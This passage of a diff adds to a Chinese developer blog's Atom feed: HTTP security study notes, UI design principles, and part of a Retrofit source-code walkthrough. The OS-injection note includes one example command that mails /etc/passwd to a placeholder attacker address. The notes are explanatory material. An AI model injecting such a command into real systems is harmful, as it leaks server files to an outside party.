+&lt;h3 id=&quot;gen-zheng-shu&quot;&gt;根证书&lt;a class=&quot;zola-anchor&quot; href=&quot;#gen-zheng-shu&quot; aria-label=&quot;Anchor link for: gen-zheng-shu&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;是公开可信的自签名证书。整个密钥链认证体系，构成了密钥基础设施（PKI）。&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;httpszheng-shu-ren-zheng-guo-cheng&quot;&gt;Https证书认证过程&lt;a class=&quot;zola-anchor&quot; href=&quot;#httpszheng-shu-ren-zheng-guo-cheng&quot; aria-label=&quot;Anchor link for: httpszheng-shu-ren-zheng-guo-cheng&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;证书是由公钥、颁发机构CA等明文内容+明文内容的hash计算值的签名组成。（签名：使用私钥进行加密）。
+首先是客户端获取到服务器的证书，这个证书可能会包括中间证书，最后会指向根证书。
+然后对证书的签名进行验证证书合法性，使用证书颁发机构CA的公钥对签名进行解密，获得hash值并比较证书内容计算后的hash值是否相同，来判断证书是否合法。&lt;&#x2F;p&gt;
+&lt;p&gt;如果服务器证书包含中间证书的话，1.先获取中间证书的公钥来解密签名判断服务器证书有效性。2.再根据中间证书的颁发机构CA，获取中间证书颁发机构CA的公钥解密中间证书的签名，证明中间证书的有效性。3.以此类推，最后指向一个根证书，只要证明根证书的签名合法性，也就证明了这些中间证书也是合法的。最后，判断服务器证书也是合法的。就可以用服务器证书的公钥，对数据传输的对称密钥进行加密，通过对称密钥进行加密通信。&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;zheng-shu-fen-lei&quot;&gt;证书分类&lt;a class=&quot;zola-anchor&quot; href=&quot;#zheng-shu-fen-lei&quot; aria-label=&quot;Anchor link for: zheng-shu-fen-lei&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;==费解的地方：要分类证书类别，对公钥功能拆分。除了根证书，签名验证要找证书认证机构的公钥。而不是自己的公钥==
+服务器证书：公钥，用于加密通信用。
+中间证书：公钥，用于证明服务器证书合法性
+根证书：公钥，用于证明中间证书&#x2F;服务器证书的合法性。自签名证书，公钥解密自己的签名。&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;https-tong-xin&quot;&gt;HTTPS 通信&lt;a class=&quot;zola-anchor&quot; href=&quot;#https-tong-xin&quot; aria-label=&quot;Anchor link for: https-tong-xin&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;双方通信，客户端获取服务端证书并验证后，发送随机密钥串，完成SSL握手。客户端开始通过密钥串对HTTP报文加密通信。&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;shen-fen-ren-zheng&quot;&gt;身份认证&lt;a class=&quot;zola-anchor&quot; href=&quot;#shen-fen-ren-zheng&quot; aria-label=&quot;Anchor link for: shen-fen-ren-zheng&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;h4 id=&quot;basicren-zheng&quot;&gt;BASIC认证&lt;a class=&quot;zola-anchor&quot; href=&quot;#basicren-zheng&quot; aria-label=&quot;Anchor link for: basicren-zheng&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h4&gt;
+&lt;p&gt;HTTP1.0就有了，使用请求头加入账号:密码的Base64字符串形式，不够安全。&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;biao-dan-ren-zheng&quot;&gt;表单认证&lt;a class=&quot;zola-anchor&quot; href=&quot;#biao-dan-ren-zheng&quot; aria-label=&quot;Anchor link for: biao-dan-ren-zheng&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h4&gt;
+&lt;p&gt;也就是利用post请求提交表单，利用cookie携带登录信息认证的。&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;webdav&quot;&gt;WebDAV&lt;a class=&quot;zola-anchor&quot; href=&quot;#webdav&quot; aria-label=&quot;Anchor link for: webdav&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h4&gt;
+&lt;p&gt;WebDAV（ Web-based Distributed Authoring and Versioning，基于万
+维网的分布式创作和版本控制）
+是HTTP的扩展协议，用于服务器相关文件操作，增加了其他的请求方法。&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;css&quot;&gt;CSS&lt;a class=&quot;zola-anchor&quot; href=&quot;#css&quot; aria-label=&quot;Anchor link for: css&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;让文档内容和设计分离。&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;xml&quot;&gt;XML&lt;a class=&quot;zola-anchor&quot; href=&quot;#xml&quot; aria-label=&quot;Anchor link for: xml&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;XML（ eXtensible Markup Language，可扩展标记语言）&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;sgml&quot;&gt;SGML&lt;a class=&quot;zola-anchor&quot; href=&quot;#sgml&quot; aria-label=&quot;Anchor link for: sgml&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;标准通用标记语言 SGML（ Standard Generalized
+Markup Language）&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;json&quot;&gt;JSON&lt;a class=&quot;zola-anchor&quot; href=&quot;#json&quot; aria-label=&quot;Anchor link for: json&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;JSON（ JavaScript Object Notation）是一种以 JavaScript（ ECMAScript）
+的对象表示法为基础的轻量级数据标记语言。&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;xss&quot;&gt;XSS&lt;a class=&quot;zola-anchor&quot; href=&quot;#xss&quot; aria-label=&quot;Anchor link for: xss&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;跨站脚本攻击（ Cross-Site Scripting， XSS），就是在访问一个网页请求时，添加一些&lt;code&gt;&amp;lt;script&#x2F;&amp;gt;&lt;&#x2F;code&gt;脚本代码，里面会访问其他网站，这样会把账号和密码等信息传给其他网站。也可以通过==document.cookie==把当前网站的cookie传给第三方网站。&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;sql-zhu-ru-gong-ji&quot;&gt;SQL 注入攻击&lt;a class=&quot;zola-anchor&quot; href=&quot;#sql-zhu-ru-gong-ji&quot; aria-label=&quot;Anchor link for: sql-zhu-ru-gong-ji&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;SQL 注入（ SQL Injection），是指Web中通过请求来访问SQL语句时，利用SQL语法特性，比如：添加--表示注释，就把后面一些条件去掉了。达到修改SQL语句来获取请求查询结果。&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;oszhu-ru-gong-ji&quot;&gt;OS注入攻击&lt;a class=&quot;zola-anchor&quot; href=&quot;#oszhu-ru-gong-ji&quot; aria-label=&quot;Anchor link for: oszhu-ru-gong-ji&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;利用服务器web请求，对请求参数执行os指令来进行加入一些os指令获取信息。比如：发送邮箱内容时，额外添加cat &#x2F;etc&#x2F;passwd | mail hack@example.jp，来达到发送服务器密码给邮箱。&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="zh">
+        <title>UI交互设计原则</title>
+        <published>2024-04-21T00:00:00+00:00</published>
+        <updated>2025-09-07T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Obelieve
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://obelieve.github.io/blog/uijiao-hu-she-ji-yuan-ze/"/>
+        <id>https://obelieve.github.io/blog/uijiao-hu-she-ji-yuan-ze/</id>
+        
+        <content type="html" xml:base="https://obelieve.github.io/blog/uijiao-hu-she-ji-yuan-ze/">&lt;p&gt;首要目标是评估用户体验。
+用户体验：
+让用户付出最小成本满足需求 - 易用性
+自然，自然的体验是不需要用户去思考的 - 易学习性&lt;&#x2F;p&gt;
+&lt;p&gt;Jakob Nielsen（雅各布·尼尔森）：交互设计的十大法则 “启发式”设计原则&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;ol&gt;
+&lt;li&gt;状态可见原则：让用户快速的了解自己处于何种状态，让用户清楚已发生什么、当前目标是什么、以及未来要怎样。在合适的时间给用户适当的反馈，防止用户使用出现错误。&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;ul&gt;
+&lt;li&gt;按钮状态变化反馈&lt;&#x2F;li&gt;
+&lt;li&gt;长时间加载时，时间进度指示器，减少了不确定性-防止用户多次单击同一按钮。&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;2.用户可控原则：用户常常会误触到某些功能，系统应该让用户可以方便的退出。&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;用户进行某些操作时，忽然意识到自己不对，需要修改撤回的地方，这个叫临界效应，所以最好支持撤销&#x2F;重做功能。&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;3.一致性原则：同一文案、功能、操作保持一致。&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;结构一致性：规则的有逻辑的排列顺序能减轻用户思考负担。&lt;&#x2F;li&gt;
+&lt;li&gt;色彩一致性：产品所使用的主色调应该保持统一。&lt;&#x2F;li&gt;
+&lt;li&gt;操作一致性：减少用户学习成本。
+&lt;ul&gt;
+&lt;li&gt;App返回上一级页面，都通过左上角进行。&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;反馈一致性：用户点击的反馈效果应该一致。
+&lt;ul&gt;
+&lt;li&gt;页面滑出效果：都是从左往右滑回，从右往左滑出。&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;文字样式一致性：产品呈现给用户阅读的文字大小、样式、颜色、布局等不同页面的相同模块都应该是一致的。&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;4.环境贴切原则：使用用户熟悉的语言、文字、语句，或者其他用户熟悉的概念，而非系统语言。软件信息应该尽量贴近真实世界，让用户容易理解。&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;计算器的软件界面，和我们现实中使用的样式差不多。&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;5.易取原则：组件、按钮及选项可见化，降低用户记忆负担。用户不需要记住各个对话框中的信息。软件的使用指南应该是可见的，且在合适的时候可以再次查看。&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;6.灵活高效原则：有些操作对不同用户使用频率需求是不同的，允许用户定制常用功能也许是个不错的选择。&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;7.优美且简约原则：对话中的内容应该去除不相关的信息或几乎不需要的信息。任何不相关的信息都会让原本重要的信息更难被用户察觉。&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;8.防错原则：比一个优秀错误提醒弹窗更好的设计方式，是在这个错误发生之前就避免它。可以帮助用户排除一些容易出错的情况，或在用户提交之前给他一个确认的选项。&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;登录页面，未填写完账号密码之前，登录按钮置灰不可点击。&lt;&#x2F;li&gt;
+&lt;li&gt;退出编辑页面，弹出弹窗提示。&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;9.容错原则：错误信息指出错误是什么，并给出解决建议。帮助用户识别出错误，分析出错误的原因再帮助用户回到正确的道路上。如果真的不能帮助用户从错误中恢复，也要尽量为用户提供帮助让用户损失降到最低。&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;密码输入，强弱是否一致&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;10.人性化帮助原则：提供帮助文档，方便用户搜索到。&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="zh">
+        <title>Retrofit源码分析 2.10.0-SNAPSHOT</title>
+        <published>2022-03-06T00:00:00+00:00</published>
+        <updated>2025-09-03T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Obelieve
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://obelieve.github.io/blog/retrofityuan-ma-fen-xi-2-10-0-snapshot/"/>
+        <id>https://obelieve.github.io/blog/retrofityuan-ma-fen-xi-2-10-0-snapshot/</id>
+        
+        <content type="html" xml:base="https://obelieve.github.io/blog/retrofityuan-ma-fen-xi-2-10-0-snapshot/">&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;obelieve.top&#x2F;site&#x2F;images&#x2F;retrofit%E6%B5%81%E7%A8%8B%E5%9B%BE.png&quot; alt=&quot;流程图.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;1-jie-shao&quot;&gt;1. 介绍&lt;a class=&quot;zola-anchor&quot; href=&quot;#1-jie-shao&quot; aria-label=&quot;Anchor link for: 1-jie-shao&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;Retrofit主要是基于OKHttp进一步封装的网络请求的框架。它采用了一种接口方法声明请求的方式，使用方法注解和方法参数注解进行标记请求信息，通过动态代理访问接口方法并解析Method，最后将请求信息汇总组装成okhttp3.Request对象，再根据接口方法返回值类型决定调用适配器(CallAdapter)，内部通过okhttp3.Call.enqueue(..) 或okhttp3.Call.execute() 同步&#x2F;异步请求，请求响应后通过转换器(Converter)把okhttp3.ResponseBody数据再进行一次转换得到最后的数据。&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;2-suspend-guan-jian-zi-kotlin-xie-cheng-fang-shi-shi-yong&quot;&gt;2.suspend 关键字，Kotlin 协程方式使用&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-suspend-guan-jian-zi-kotlin-xie-cheng-fang-shi-shi-yong&quot; aria-label=&quot;Anchor link for: 2-suspend-guan-jian-zi-kotlin-xie-cheng-fang-shi-shi-yong&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;接口方法标记为suspend，会把返回类型T 包装成Call&lt;T&gt;，然后使用异步(enqueue)，通过KotlinExtensions.kt下的Call&lt;T&gt;.await()包装成协程执行（请求时挂起协程，响应后协程resume继续执行）。&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;3-calladaptershi-xian-lei-jie-shao&quot;&gt;3.CallAdapter实现类介绍&lt;a class=&quot;zola-anchor&quot; href=&quot;#3-calladaptershi-xian-lei-jie-shao&quot; aria-label=&quot;Anchor link for: 3-calladaptershi-xian-lei-jie-shao&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;RxJava2CallAdapterFactory&lt;&#x2F;code&gt;.create(isAsync);&#x2F;&#x2F;isAsync = true or false来判断是否是异步或同步请求。默认是同步请求也就是false。&lt;&#x2F;li&gt;
+&lt;li&gt;默认的CallAdapter实现类
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;DefaultCallAdapterFactory&lt;&#x2F;code&gt;：&lt;code&gt;Call&amp;lt;T&amp;gt;类型的，调用同步(execute)或异步(enqueue)。&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;CompletableFutureCallAdapterFactory&lt;&#x2F;code&gt;：&lt;code&gt;CompletableFuture&amp;lt;T&amp;gt;类型的，使用异步(enqueue)。&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h2 id=&quot;4-yong-fa&quot;&gt;4.用法&lt;a class=&quot;zola-anchor&quot; href=&quot;#4-yong-fa&quot; aria-label=&quot;Anchor link for: 4-yong-fa&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;这一小节通过一系列不同请求方式的代码来展示相关的用法。
+主要分为6个文件，具体代码文件在最后面。&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;ServiceInterface.kt 声明接口请求&lt;&#x2F;li&gt;
+&lt;li&gt;Main.kt 测试接口请求&lt;&#x2F;li&gt;
+&lt;li&gt;ApiConverterFactory.java 转换器工厂类&lt;&#x2F;li&gt;
+&lt;li&gt;ApiRequestBodyConverter.java  转为RequestBody对象转换器类 （@Part 参数对象转为RequestBody）&lt;&#x2F;li&gt;
+&lt;li&gt;ApiResponseBodyConverter.java  ResponseBody对象转换器类&lt;&#x2F;li&gt;
+&lt;li&gt;HttpBinResponse.java  ResponseBody装好后的数据类&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;4-1-ji-ben-yong-fa&quot;&gt;4.1 基本用法&lt;a class=&quot;zola-anchor&quot; href=&quot;#4-1-ji-ben-yong-fa&quot; aria-label=&quot;Anchor link for: 4-1-ji-ben-yong-fa&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;1.GET 请求下载文件&lt;&#x2F;li&gt;
+&lt;li&gt;2.GET 请求&lt;&#x2F;li&gt;
+&lt;li&gt;3.GET 请求 查询?name=value&lt;&#x2F;li&gt;
+&lt;li&gt;4.GET 请求 查询?name&lt;&#x2F;li&gt;
+&lt;li&gt;5.POST 请求&lt;&#x2F;li&gt;
+&lt;li&gt;6.POST 请求  表单数据提交 name=&quot;名字&quot;&amp;amp;content=&quot;内容&quot;&lt;&#x2F;li&gt;
+&lt;li&gt;7.POST 请求  多部分表单提交 multipart&#x2F;form-data&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;4-2-jin-jie-yong-fa&quot;&gt;4.2 进阶用法&lt;a class=&quot;zola-anchor&quot; href=&quot;#4-2-jin-jie-yong-fa&quot; aria-label=&quot;Anchor link for: 4-2-jin-jie-yong-fa&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;1.通过@URL 请求一个不同地址的URL&lt;&#x2F;li&gt;
+&lt;li&gt;2.通过Interceptor拦截器，实现动态设置不同BaseUrl&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h2 id=&quot;5-yuan-ma-ju-ti-shi-li-fen-xi&quot;&gt;5. 源码具体示例分析&lt;a class=&quot;zola-anchor&quot; href=&quot;#5-yuan-ma-ju-ti-shi-li-fen-xi&quot; aria-label=&quot;Anchor link for: 5-yuan-ma-ju-ti-shi-li-fen-xi&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;这一小节，通过一个post表单提交梳理下执行流程。以下是这个post请求的代码：分为三部分&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;1.接口请求声明部分&lt;&#x2F;li&gt;
+&lt;li&gt;2.Retrofit类构建，并返回接口的实现类部分&lt;&#x2F;li&gt;
+&lt;li&gt;3.接口请求测试部分&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;interface ServiceInterface {
+...
+companion object {
+        var BASE_URL = &amp;quot;http:&amp;#x2F;&amp;#x2F;www.httpbin.org&amp;#x2F;&amp;quot;
+    }
+@POST(&amp;quot;&amp;#x2F;post&amp;quot;)
+    @FormUrlEncoded
+    fun post(@Field(&amp;quot;name&amp;quot;) name:String,@Field(&amp;quot;content&amp;quot;) content:String): Call&amp;lt;ResponseBody&amp;gt;
+...
+}
+public class Main {
+...
+private static ServiceInterface sServiceInterface
+ = new Retrofit.Builder()
+.baseUrl(ServiceInterface.Companion.getBASE_URL())
+.client(new OkHttpClient.Builder().build())
+.addCallAdapterFactory(RxJava2CallAdapterFactory.create())
+.addConverterFactory(ApiConverterFactory.create())
+.build()
+.create(ServiceInterface.class);
+&amp;#x2F;**
+     * Post请求，表单提交 @FormUrlEncoded @Field
+     *&amp;#x2F;
+    @Test
+    public void testPostFormUrlEncoded(){
+        String s = null;
+        try {
+            Response&amp;lt;ResponseBody&amp;gt; response = sServiceInterface.post(&amp;quot;名字&amp;quot;,&amp;quot;内容&amp;quot;).execute();
+            s = response.body().string();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        System.out.println(s);
+    }
+...
+}
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;从&lt;code&gt;sServiceInterface.post(&quot;名字&quot;,&quot;内容&quot;).execute();&lt;&#x2F;code&gt;开始分析
+1.先看看&lt;code&gt;sServiceInterface&lt;&#x2F;code&gt;是怎么创建的?
+2.再看看调用&lt;code&gt;post(&quot;名字&quot;,&quot;内容&quot;)&lt;&#x2F;code&gt;方法是怎么回事?
+3.最后看下执行&lt;code&gt;execute()&lt;&#x2F;code&gt;是怎么样的？&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;kai-shi-fen-xi-1&quot;&gt;开始分析1.&lt;a class=&quot;zola-anchor&quot; href=&quot;#kai-shi-fen-xi-1&quot; aria-label=&quot;Anchor link for: kai-shi-fen-xi-1&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;pre data-lang=&quot;java&quot; class=&quot;language-java &quot;&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&amp;#x2F;&amp;#x2F;先进入Retrofit#create(..)方法
+public &amp;lt;T&amp;gt; T create(final Class&amp;lt;T&amp;gt; service) {
+    return (T)
+        Proxy.newProxyInstance(
+            service.getClassLoader(),
+            new Class&amp;lt;?&amp;gt;[] {service},
+            new InvocationHandler() {
+            ...
+              @Override
+              public @Nullable Object invoke(Object proxy, Method method, @Nullable Object[] args)
+                  throws Throwable {
+               ...
+                return platform.isDefaultMethod(method)
+                    ? platform.invokeDefaultMethod(method, service, proxy, args)
+                    : loadServiceMethod(method).invoke(args); &amp;#x2F;&amp;#x2F;看重点部分
+              }
+            });
+&amp;#x2F;&amp;#x2F;分析1结束，通过Proxy.newProxyInstance(..)动态代理获取接口ServiceInterface代理对象。
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h3 id=&quot;kai-shi-fen-xi-2&quot;&gt;开始分析2.&lt;a class=&quot;zola-anchor&quot; href=&quot;#kai-shi-fen-xi-2&quot; aria-label=&quot;Anchor link for: kai-shi-fen-xi-2&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;从上一步的&lt;code&gt;loadServiceMethod(method).invoke(args)&lt;&#x2F;code&gt;开始分为2个部分：&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;2.1 &lt;code&gt;loadServiceMethod(method)&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;2.2 调用&lt;code&gt;invoke(args)&lt;&#x2F;code&gt;方法&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h4 id=&quot;kai-shi-fen-xi-2-1-loadservicemethod-method&quot;&gt;开始分析2.1 &lt;code&gt;loadServiceMethod(method)&lt;&#x2F;code&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#kai-shi-fen-xi-2-1-loadservicemethod-method&quot; aria-label=&quot;Anchor link for: kai-shi-fen-xi-2-1-loadservicemethod-method&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h4&gt;
+&lt;pre data-lang=&quot;java&quot; class=&quot;language-java &quot;&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt; &amp;#x2F;&amp;#x2F;从Retrofit#loadServiceMethod(..)开始
+  ServiceMethod&amp;lt;?&amp;gt; loadServiceMethod(Method method) {
+       ...
+        result = ServiceMethod.parseAnnotations(this, method);
+       ...
+    }
+    return result;
+  }
+&amp;#x2F;&amp;#x2F;ServiceMethod#parseAnnotations(..)
+  static &amp;lt;T&amp;gt; ServiceMethod&amp;lt;T&amp;gt; parseAnnotations(Retrofit retrofit, Method method) {
+    &amp;#x2F;&amp;#x2F;解析生成RequestFactory对象，具体流程在【流程图】图片有描述
+    RequestFactory requestFactory = RequestFactory.parseAnnotations(retrofit, method);
+    return HttpServiceMethod.parseAnnotations(retrofit, method, requestFactory);
+  }
+
+&amp;#x2F;&amp;#x2F;HttpServiceMethod.parseAnnotations(..)
+  static &amp;lt;ResponseT, ReturnT&amp;gt; HttpServiceMethod&amp;lt;ResponseT, ReturnT&amp;gt; parseAnnotations(
+      Retrofit retrofit, Method method, RequestFactory requestFactory) {
+    ...
+      adapterType = method.getGenericReturnType();
+    ...
+  &amp;#x2F;&amp;#x2F;获取调用适配器CallAdapter对象，具体流程在【流程图】图片有描述
+    CallAdapter&amp;lt;ResponseT, ReturnT&amp;gt; callAdapter =
+        createCallAdapter(retrofit, method, adapterType, annotations);
+    Type responseType = callAdapter.responseType();
+    ...
+  &amp;#x2F;&amp;#x2F;获取转换器Converter对象，具体流程在【流程图】图片有描述
+    Converter&amp;lt;ResponseBody, ResponseT&amp;gt; responseConverter =
+        createResponseConverter(retrofit, method, responseType);
+  ...
+  okhttp3.Call.Factory callFactory = retrofit.callFactory;
+  return new CallAdapted&amp;lt;&amp;gt;(requestFactory, callFactory, responseConverter, callAdapter);
+  ...
+  }
+&amp;#x2F;**CallAdapted extends HttpServiceMethod&amp;lt;ResponseT, ReturnT&amp;gt;
+HttpServiceMethod&amp;lt;ResponseT, ReturnT&amp;gt; extends ServiceMethod&amp;lt;ReturnT&amp;gt;
+**&amp;#x2F;
+&amp;#x2F;&amp;#x2F;最后返回CallAdapted对象，分析2.1结束。
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h4 id=&quot;kai-shi-fen-xi-2-2-diao-yong-invoke-args-fang-fa&quot;&gt;开始分析 2.2  调用&lt;code&gt;invoke(args)&lt;&#x2F;code&gt;方法&lt;a class=&quot;zola-anchor&quot; href=&quot;#kai-shi-fen-xi-2-2-diao-yong-invoke-args-fang-fa&quot; aria-label=&quot;Anchor link for: kai-shi-fen-xi-2-2-diao-yong-invoke-args-fang-fa&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h4&gt;
+&lt;pre data-lang=&quot;java&quot; class=&quot;language-java &quot;&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&amp;#x2F;**CallAdapted中没有invoke方法，invoke方法的实现位于它的父类HttpServiceMethod中**&amp;#x2F;
+&amp;#x2F;&amp;#x2F;HttpServiceMethod#invoke(..)
+ @Override
+  final @Nullable ReturnT invoke(Object[] args) {
+    Call&amp;lt;ResponseT&amp;gt; call = new OkHttpCall&amp;lt;&amp;gt;(requestFactory, args, callFactory, responseConverter);
+    return adapt(call, args);
+  }
+&amp;#x2F;&amp;#x2F;adapt(call, args)方法的实现位于CallAdapted中
+&amp;#x2F;&amp;#x2F;CallAdapted#adapt(..)
+    @Override
+    protected ReturnT adapt(Call&amp;lt;ResponseT&amp;gt; call, Object[] args) {
+      return callAdapter.adapt(call);
+    }
+&amp;#x2F;**调用到CallAdapter#adapt(call)方法，由于之前请求接口方法返回值是Call&amp;lt;ResponseBody&amp;gt;，所以调用DefaultCallAdapterFactory#get(..)返回callAdapter对象
+**&amp;#x2F;
+&amp;#x2F;&amp;#x2F;DefaultCallAdapterFactory#get(..)
+  @Override
+  public @Nullable CallAdapter&amp;lt;?, ?&amp;gt; get(
+      Type returnType, Annotation[] annotations, Retrofit retrofit) {
+    ...
+    return new CallAdapter&amp;lt;Object, Call&amp;lt;?&amp;gt;&amp;gt;() {
+      @Override
+      public Type responseType() {
+        return responseType;
+      }
+      @Override
+      public Call&amp;lt;Object&amp;gt; adapt(Call&amp;lt;Object&amp;gt; call) {
+        return executor == null ? call : new ExecutorCallbackCall&amp;lt;&amp;gt;(executor, call);
+      }
+    };
+  }
+&amp;#x2F;&amp;#x2F;最后返回ExecutorCallbackCall对象，分析2.2结束
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h3 id=&quot;kai-shi-fen-xi-3&quot;&gt;开始分析3.&lt;a class=&quot;zola-anchor&quot; href=&quot;#kai-shi-fen-xi-3&quot; aria-label=&quot;Anchor link for: kai-shi-fen-xi-3&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;pre data-lang=&quot;java&quot; class=&quot;language-java &quot;&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&amp;#x2F;&amp;#x2F;从上一步最后返回ExecutorCallbackCall对象，开始分析
+&amp;#x2F;&amp;#x2F;在ExecutorCallbackCall类中
+...
+   ExecutorCallbackCall(Executor callbackExecutor, Call&amp;lt;T&amp;gt; delegate) {
+      this.callbackExecutor = callbackExecutor;
